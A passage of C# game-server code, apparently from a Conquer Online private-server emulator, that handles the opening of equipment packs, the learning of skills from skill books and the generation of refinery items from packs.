                #region SuperNecklacePack
                case 721234:
                    {
                        uint itemid = 120129;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperRingPack
                case 721235:
                    {
                        uint itemid = 150139;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperTaoist`sBagPack
                case 721236:
                    {
                        uint itemid = 121129;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperTaoist`sBraceletPack
                case 721237:
                    {
                        uint itemid = 152149;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperBootsPack
                case 721238:
                    {
                        uint itemid = 160139;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperBladePack
                case 721239:
                    {
                        uint itemid = 410139;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperSwordPack
                case 721240:
                    {
                        uint itemid = 420139;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperClubPack
                case 721241:
                    {
                        uint itemid = 480139;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperShieldPack
                case 721242:
                    {
                        uint itemid = 900049;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperKatanaPack
                case 721243:
                    {
                        uint itemid = 601139;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperBackswordPack
                case 721244:
                    {
                        uint itemid = 421139;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperBowPack
                case 721245:
                    {
                        uint itemid = 500129;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #endregion
                #region SkillBooks
                case 725000:
                    {
                        if (client.Entity.Spirit >= 20)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1000 });
                        }
                        else
                        {
                            client.Send(new Message("You need atleast 20 spirit!", System.Drawing.Color.Tan, Message.TopLeft));
                        }
                        break;
                    }
                case 725001:
                    {
                        if (client.Entity.Spirit >= 80)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1001 });
                        }
                        else
                        {
                            client.Send(new Message("You need atleast 80 spirit!", System.Drawing.Color.Tan, Message.TopLeft));
                        }
                        break;
                    }
                case 725002:
                    {
                        if (client.Entity.Class >= 140 && client.Entity.Class <= 145 && client.Entity.Level >= 90)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1002 });
                        }
                        break;
                    }
                case 725003:
                    {
                        if (client.Entity.Spirit >= 30)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1005 });
                        }
                        break;
                    }
                case 725004:
                    {
                        if (client.Entity.Class >= 130 && client.Entity.Class <= 135 || client.Entity.Class >= 140 && client.Entity.Class <= 145 && client.Entity.Level >= 15 || client.Entity.Class == 100 || client.Entity.Class == 101)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1010 });
                        }
                        break;
                    }
                case 725005:
                    {
                        if (client.Entity.Level >= 40)
                        {
                            for (int i = 0; i < Database.SpellTable.SpellInformations[1045][0].WeaponSubtype.Count; i++)
                            {
                                var prof = Database.SpellTable.SpellInformations[1045][0].WeaponSubtype[i];
                                if (client.Proficiencies.ContainsKey(prof))
                                    if (client.Proficiencies[prof].Level >= 5)
                                    {
                                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                                        client.AddSpell(new Spell(true) { ID = 1045 });
                                        return;
                                    }
                            }
                            client.Send(new Message("You need level 5 at blade proficiency!", System.Drawing.Color.Tan, Message.TopLeft));


                        }
                        break;
                    }
                case 721158:
                    {
                        if (client.Entity.Level >= 40)
                        {
                            for (int i = 0; i < Database.SpellTable.SpellInformations[11005][0].WeaponSubtype.Count; i++)
                            {

                                var prof = Database.SpellTable.SpellInformations[11005][0].WeaponSubtype[i];
                                if (client.Proficiencies.ContainsKey(prof))
                                    if (client.Proficiencies[prof].Level >= 5)
                                    {
                                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                                        client.AddSpell(new Spell(true) { ID = 11005 });
                                        return;
                                    }

                            }
                            client.Send(new Message("You need level 5 at Spear proficiency!", System.Drawing.Color.Tan, Message.TopLeft));

                        }
                        break;
                    }
                case 721157:
                    {
                        if (client.Entity.Level >= 40)
                        {
                            for (int i = 0; i < Database.SpellTable.SpellInformations[11000][0].WeaponSubtype.Count; i++)
                            {

                                var prof = Database.SpellTable.SpellInformations[11000][0].WeaponSubtype[i];
                                if (client.Proficiencies.ContainsKey(prof))
                                    if (client.Proficiencies[prof].Level >= 5)
                                    {
                                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                                        client.AddSpell(new Spell(true) { ID = 11000 });
                                    }
                            }
                            client.Send(new Message("You need level 5 at Wand proficiency!", System.Drawing.Color.Tan, Message.TopLeft));

                        }
                        break;
                    }
                case 725010:
                    {
                        if (client.Entity.Level >= 40)
                        {
                            for (int i = 0; i < Database.SpellTable.SpellInformations[1046][0].WeaponSubtype.Count; i++)
                            {
                                var prof = Database.SpellTable.SpellInformations[1046][0].WeaponSubtype[i];

                                if (client.Proficiencies.ContainsKey(prof))
                                    if (client.Proficiencies[prof].Level >= 5)
                                    {
                                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                                        client.AddSpell(new Spell(true) { ID = 1046 });
                                        return;
                                    }
                            }

                            client.Send(new Message("You need level 5 at sword proficiency!", System.Drawing.Color.Tan, Message.TopLeft));

                        }
                        break;
                    }
                case 725011:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1250 });
                        break;
                    }
                case 725012:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1260 });
                        break;
                    }
                case 725013:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1290 });
                        break;
                    }
                case 725014:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1300 });
                        break;
                    }
                case 725015:
                    {
                        if (client.Entity.Class >= 130 && client.Entity.Class <= 135)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1350 });
                        }
                        break;
                    }
                case 725016:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1360 });
                        break;
                    }
                case 725018:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1380 });
                        break;
                    }
                case 725019:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1385 });
                        break;
                    }
                case 725020:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1390 });
                        break;
                    }
                case 725021:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1395 });
                        break;
                    }
                case 725022:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1400 });
                        break;
                    }
                case 725023:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1405 });
                        break;
                    }
                case 725024:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1410 });
                        break;
                    }
                case 725025:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 1320 });
                        break;
                    }
                case 725026:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 5010 });
                        break;
                    }
                case 725027:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 5020 });
                        break;
                    }
                case 725028:
                    {
                        if (client.Entity.Class >= 130 && client.Entity.Class <= 135 || client.Entity.Class >= 140 && client.Entity.Class <= 145)
                            client.AddSpell(new Spell(true) { ID = 5001 });
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 725029:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 5030 });
                        break;
                    }
                case 725030:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 5040 });
                        break;
                    }
                case 725031:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 5050 });
                        break;
                    }
                case 725040:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 7000 });
                        break;
                    }
                case 725041:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 7010 });
                        break;
                    }
                case 725042:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 7020 });
                        break;
                    }
                case 725043:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 7030 });
                        break;
                    }
                case 725044:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.AddSpell(new Spell(true) { ID = 7040 });
                        break;
                    }
                case 1060100:
                    {
                        if (client.Entity.Class >= 140 && client.Entity.Class <= 145 && client.Entity.Level >= 82)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1160 });
                        }
                        break;
                    }
                case 1060101:
                    {
                        if (client.Entity.Class >= 140 && client.Entity.Class <= 145 && client.Entity.Level >= 84)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.AddSpell(new Spell(true) { ID = 1165 });
                        }
                        break;
                    }
                #endregion
                #region Refinery Packs

                #region Penetration - Bracelet
                case 723130:
                case 723131:
                case 723132:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 1260;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Penetration - Headgear
                case 723684:
                case 723685:
                case 723686:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 696;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Penetration - Bag
                case 724148:
                case 724149:
                case 724150:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 237;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region Skill Critical Strike - Backsword
                case 723133:
                case 723134:
                case 723135:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 1287;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Skill Critical Strike - Bracelet
                case 724195:
                case 724196:
                case 724197:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 230;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region Block - Shield
                case 723669:
                case 723670:
                case 723671:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 689;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Block - Headgear
                case 724145:
                case 724146:
                case 724147:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 208;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region CriticalStrike - Bow
                case 723651:
                case 723652:
                case 723653:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 749;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region CriticalStrike - 1 Handed weapons
                case 723654:
                case 723655:
                case 723656:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 751;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region CriticalStrike - 2 Handed weapons
                case 723657:
                case 723658:
                case 723659:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 753;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region CriticalStrike - 2 Ring
                case 724215:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 200;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                case 724193:
                case 724194:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 223;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region Detoxication - Necklace
                case 723681:
                case 723682:
                case 723683:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 667;
                        if (newItemID == 724348 || newItemID == 724349)
                            newItemID += 150;

                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Detoxication - Headgear
                case 723672:
                case 723673:
                case 723674:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 811;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Detoxication - Bag
                case 723690:
                case 723691:
                case 723692:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 683;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Detoxication - Armor
                case 723675:
                case 723676:
                case 723677:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 813;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Detoxication - Boots
                case 723678:
                case 723679:
                case 723680:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 815;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region Breakthrough - 1 Handed weapons
                case 723660:
                case 723661:
                case 723662:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 789;
                        if (newItemID == 724449)
                            newItemID = 724445;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Breakthrough - 2 Handed weapons
                case 723663:
                case 723664:
                case 723665:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 791;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Breakthrough - Bracelet
                case 724201:
                case 724202:
                case 724203:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 162;
